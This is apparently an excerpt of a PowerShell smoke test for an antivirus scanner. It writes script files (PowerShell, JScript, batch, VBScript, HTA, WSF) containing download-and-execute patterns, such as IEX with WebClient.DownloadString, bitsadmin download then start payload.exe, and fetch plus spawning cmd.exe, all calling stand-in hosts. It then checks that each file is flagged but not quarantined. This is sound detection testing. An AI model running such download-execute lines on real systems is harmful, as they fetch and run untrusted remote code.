...
function Resolve-LocalCoreBinary {
  ...
  if ([System.IO.Path]::GetFileName($resolved) -ne "zentor_local_core.exe") {
    throw "Release local-core quick-scan script carrier smoke expects zentor_local_core.exe, got: $resolved"
  }
  return $resolved
}
  ...
  try {
    ...
    if (-not $process.WaitForExit($Timeout * 1000)) {
      try {
        ...
        throw "release local-core quick-scan script carrier smoke timed out after ${Timeout}s and failed to stop: $(Get-BoundedText $_.Exception.Message)"
      }
      throw "release local-core quick-scan script carrier smoke timed out after ${Timeout}s."
    }
    ...
    foreach ($line in ($stdout -split "`r?`n")) {
      ...
      try {
        ...
        throw "release local-core emitted non-JSON stdout during quick-scan script carrier smoke: $(Get-BoundedText $trimmed)"
      }
...
$tempRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("avorax-release-local-core-quickscan-script-carrier-smoke-" + [System.Guid]::NewGuid().ToString("N"))
...
try {
  ...
  $scriptFixtures = @(
    (New-ScriptFixture "dropper-release.ps1" "powershell -NoProfile -EncodedCommand AAAA; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/payload.txt')" @("encoded_script_command", "download_execute_script")),
    (New-ScriptFixture "support-release.jse" "const payload = atob('AAAA'); fetch('https://example.invalid/payload.js'); require('child_process').spawn('cmd.exe');" @("encoded_script_command", "download_execute_script")),
    (New-ScriptFixture "repair-release.cmd" "bitsadmin /transfer job https://example.invalid/payload.exe payload.exe`r`nstart payload.exe`r`npowershell -NoProfile -File helper.ps1" @("download_execute_script")),
    (New-ScriptFixture "support-release.vbs" "base64 marker: Set x = CreateObject(`"MSXML2.XMLHTTP`"): Set s = CreateObject(`"WScript.Shell`")" @("encoded_script_command", "download_execute_script")),
    (New-ScriptFixture "ticket-release.hta" "base64 marker; Set x = CreateObject(`"MSXML2.XMLHTTP`"); CreateObject(`"WScript.Shell`")" @("encoded_script_command", "download_execute_script")),
    (New-ScriptFixture "ticket-release.wsf" "base64 marker; Set x = CreateObject(`"MSXML2.XMLHTTP`"); CreateObject(`"WScript.Shell`")" @("encoded_script_command", "download_execute_script"))
  )

  foreach ($fixture in $scriptFixtures) {
    [System.IO.File]::WriteAllText(
  ...
  [System.IO.File]::WriteAllText(
    $benignFile,
    "benign release quick-scan script-carrier smoke file`r`n",
    [System.Text.UTF8Encoding]::new($false)
  )
  ...
  $expectedCarrierCount = @($scriptFixtures).Count
  if ($scan.status -ne "threatsFound") {
    throw "release local-core quick_scan_selected_paths did not return a threat status for script carrier fixtures: $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
  }
  $filesScanned = if ($null -ne $scan.files_scanned) { [int64]$scan.files_scanned } else { 0 }
  if ($filesScanned -lt $expectedCarrierCount) {
    throw "release local-core quick_scan_selected_paths did not scan every script carrier fixture: $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
  }
  $quarantinedFiles = if ($null -ne $scan.quarantined_files) { [int64]$scan.quarantined_files } else { 0 }
  if ($quarantinedFiles -ne 0) {
    throw "release local-core quick_scan_selected_paths quarantined review-only script carrier fixtures: $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
  }
  if (@($scan.scan_errors).Count -ne 0) {
    throw "release local-core quick_scan_selected_paths reported scan errors during script carrier smoke: $(Get-BoundedText ($scan.scan_errors | ConvertTo-Json -Compress -Depth 8))"
  }
  ...
  foreach ($fixture in $scriptFixtures) {
    ...
    if ($null -eq $threat) {
      throw "release local-core quick_scan_selected_paths did not report a review-only script carrier finding for $($fixture.FileName): $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
    }

    foreach ($requiredReason in @($fixture.RequiredReasons)) {
      $reason = @($threat.risk_score.reasons) | Where-Object {
        $_.id -eq $requiredReason
      } | Select-Object -First 1
      if ($null -eq $reason) {
        throw "release local-core quick_scan_selected_paths did not include $requiredReason evidence for $($fixture.FileName): $(Get-BoundedText ($threat | ConvertTo-Json -Compress -Depth 12))"
      }
    }
    if (-not (Test-Path -LiteralPath $carrierFile -PathType Leaf)) {
      throw "release local-core quick_scan_selected_paths removed a review-only script carrier fixture: $carrierFile"
    }
  }
  ...
  if ($list.ok -ne $true) {
    throw "release local-core list_quarantine failed after script carrier quick scan: $(Get-BoundedText ($list | ConvertTo-Json -Compress -Depth 8))"
  }
  if (@($list.records).Count -ne 0) {
    throw "release local-core created quarantine records after review-only script carrier scan: $(Get-BoundedText ($list | ConvertTo-Json -Compress -Depth 8))"
  }

  Write-Host "Avorax release local-core quick-scan script carrier smoke test passed."
  Write-Host "Binary: $binary"
  Write-Host "Engine dir: $engineRoot"
  Write-Host "Scan root: $downloadsRoot"
  Write-Host "Script carriers: $expectedCarrierCount"
